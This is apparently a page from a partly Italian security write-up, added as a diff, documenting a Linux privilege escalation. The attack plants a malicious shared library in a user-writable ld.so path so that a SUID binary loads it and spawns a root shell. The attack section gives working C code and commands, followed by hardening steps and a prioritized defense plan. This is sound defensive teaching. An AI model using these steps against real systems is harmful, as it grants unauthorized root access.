+<h4 id="discovery-finding-the-vulnerable-binary">Discovery: Finding the Vulnerable Binary<a class="headerlink" href="#discovery-finding-the-vulnerable-binary" title="Permanent link">&para;</a></h4>
+<p><strong>Step 1: Check for non-standard library paths</strong>
+<div class="highlight"><pre><span></span><code><span class="c1"># Check /etc/ld.so.conf.d/ for unusual paths:</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/ld.so.conf.d/
+cat<span class="w"> </span>/etc/ld.so.conf.d/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;^#&quot;</span>
+<span class="c1"># Output might include: /home/developer/libs</span>
+
+<span class="c1"># Verify if path is writable by non-root:</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/home/developer/libs
+<span class="c1"># Output: drwxrwxr-x 1 root www-data (www-data can write here!)</span>
+</code></pre></div></p>
+<p><strong>Step 2: Find SUID binary with missing library</strong>
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># For each binary, check what libraries it needs:</span>
+ldd<span class="w"> </span>/usr/sbin/testingapp
+<span class="c1"># Output example:</span>
+<span class="c1">#   libcustomapp.so =&gt; not found              ← MISSING LIBRARY!</span>
+<span class="c1">#   libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</span>
+</code></pre></div></p>
+<h4 id="the-exploit-creating-malicious-library">The Exploit: Creating Malicious Library<a class="headerlink" href="#the-exploit-creating-malicious-library" title="Permanent link">&para;</a></h4>
+<p><strong>Step 1: Create malicious libcustomapp.so</strong>
+<div class="highlight"><pre><span></span><code><span class="c1">// malicious_libcustomapp.c</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">functionLoader</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">      </span><span class="c1">// Set UID to root</span>
+<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">      </span><span class="c1">// Set GID to root</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// Spawn shell as root</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<p><strong>Step 2: Compile the malicious library</strong>
+<div class="highlight"><pre><span></span><code>gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>libcustomapp.so<span class="w"> </span>malicious_libcustomapp.c
+
+<span class="c1"># Verify it was created:</span>
+file<span class="w"> </span>libcustomapp.so
+</code></pre></div></p>
+<p><strong>Step 3: Place library in the vulnerable directory</strong>
+<div class="highlight"><pre><span></span><code>cp<span class="w"> </span>libcustomapp.so<span class="w"> </span>/home/developer/libs/
+
+<span class="c1"># Verify placement:</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/home/developer/libs/libcustomapp.so
+</code></pre></div></p>
+<p><strong>Step 4: Execute the vulnerable binary</strong>
+<div class="highlight"><pre><span></span><code>/usr/sbin/testingapp
+
+<span class="c1"># What happens:</span>
+<span class="c1"># 1. testingapp starts (SUID means it runs as root)</span>
+<span class="c1"># 2. ELF loader searches for libcustomapp.so</span>
+<span class="c1"># 3. Finds our malicious /home/developer/libs/libcustomapp.so FIRST</span>
+<span class="c1"># 4. Loads OUR library which calls setuid(0) + system(&quot;/bin/sh&quot;)</span>
+<span class="c1"># 5. Shell prompt appears as root!</span>
+
+<span class="c1"># Result:</span>
+<span class="c1"># # whoami</span>
+<span class="c1"># root</span>
+</code></pre></div></p>
+<h4 id="remediation-hardening">Remediation (Hardening)<a class="headerlink" href="#remediation-hardening" title="Permanent link">&para;</a></h4>
+<p><strong>Layer 1: Use absolute paths + remove unsafe entries</strong>
+<div class="highlight"><pre><span></span><code><span class="c1"># Remove or comment out:</span>
+cat<span class="w"> </span>/etc/ld.so.conf.d/custom.conf
+<span class="c1"># /home/developer/libs   ← REMOVE THIS</span>
+
+<span class="c1"># Rebuild the loader cache:</span>
+sudo<span class="w"> </span>ldconfig
+</code></pre></div></p>
+<p><strong>Layer 2: Remove SUID bit</strong>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span>-s<span class="w"> </span>/usr/sbin/testingapp
+</code></pre></div></p>
+<p><strong>Layer 3: Make library directories read-only</strong>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">555</span><span class="w"> </span>/home/developer/libs
+</code></pre></div></p>
+<p><strong>Layer 4: Force RPATH (static library path)</strong>
+<div class="highlight"><pre><span></span><code><span class="c1"># When compiling, use -Wl,-rpath:</span>
+gcc<span class="w"> </span>-o<span class="w"> </span>testingapp<span class="w"> </span>testingapp.c<span class="w"> </span>-lcustomapp<span class="w"> </span>-Wl,-rpath<span class="o">=</span>/usr/local/lib/secure
+<span class="c1"># Binary looks ONLY in /usr/local/lib/secure</span>
+<span class="c1"># Ignores LD_LIBRARY_PATH and /etc/ld.so.conf.d/</span>
+</code></pre></div></p>
+<h2 id="5-come-ripararlo-strategie-di-defense">5. Come Ripararlo – Strategie di Defense<a class="headerlink" href="#5-come-ripararlo-strategie-di-defense" title="Permanent link">&para;</a></h2>
+<h3 id="51-priorita-di-fix">5.1 Priorità di Fix<a class="headerlink" href="#51-priorita-di-fix" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Vulnerabilità</th>
+<th>Severity</th>
+<th>Remediation Primary</th>
+<th>Tempo Impl.</th>
+<th>Effort</th>
+<th>Collaudo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3.1 (Weak SSH)</td>
+<td>CRITICAL</td>
+<td>SSH key-based + strong policy</td>
+<td>2 hrs</td>
+<td>LOW</td>
+<td><code>ssh-keygen -t ed25519</code></td>
+</tr>
+<tr>
+<td>3.2 (Cmd Inject)</td>
+<td>CRITICAL</td>
+<td>Sanitize input + use whitelist</td>
+<td>4 hrs</td>
+<td>MEDIUM</td>
+<td><code>escapeshellarg()</code> test</td>
+</tr>
+<tr>
+<td>3.3 (Upload RCE)</td>
+<td>CRITICAL</td>
+<td>Magic bytes + disable PHP in upload dir</td>
+<td>3 hrs</td>
+<td>MEDIUM</td>
+<td>File upload test</td>
+</tr>
+<tr>
+<td>4.1 (SUID hping3)</td>
+<td>HIGH</td>
+<td>Remove SUID bit</td>
+<td>15 min</td>
+<td>LOW</td>
+<td><code>find / -perm -4000</code></td>
+</tr>
+<tr>
+<td>4.2 (Cronjob)</td>
+<td>HIGH</td>
+<td>Absolute paths + restrictive PATH</td>
+<td>1 hr</td>
+<td>MEDIUM</td>
+<td>Monitor cron execution</td>
+</tr>
+<tr>
+<td>4.3 (ld.so)</td>
+<td>HIGH</td>
+<td>Remove unsafe ld.so.conf.d entries</td>
+<td>30 min</td>
+<td>LOW</td>
+<td>Verify ld.so.conf.d</td>
+</tr>
+</tbody>
+</table>
+<h3 id="52-la-strategia-di-difesa">5.2 La Strategia Di Difesa<a class="headerlink" href="#52-la-strategia-di-difesa" title="Permanent link">&para;</a></h3>
+<p><strong>Da Fare Subito (Riparare le Vulnerabilità Web):</strong>
+1. Non usare funzioni pericolose come <code>shell_exec()</code> senza sanitizing
+2. Se proprio necessario, whitelist solo i caratteri sicuri (lettere, numeri, wildcard <code>*</code>)
+3. Upload files: controlla magic bytes, non solo estensione
+4. Disabilita PHP in <code>/images/</code> con <code>.htaccess</code> (Apache) o nginx config</p>
+<p><strong>Dopo (Elimina i Privilege Escalation):</strong>
+5. Togli SUID da binari non necessari
+6. SSH: usa solo key-based auth, password disabled
+7. Cronjob: sempre path assoluto, mai relativo
+8. LD.SO: audita <code>/etc/ld.so.conf.d/</code>, rimuovi path user-writable
+9. Controllo mensile di SUID binary con <code>find / -perm -4000</code></p>
+<p><strong>Ongoing (Monitoraggio):</strong>
+10. Scan di web input periodicamente
+11. Audit file permission (monthly)
+12. Log analysis per accessi non autorizzati</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "toc.follow", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
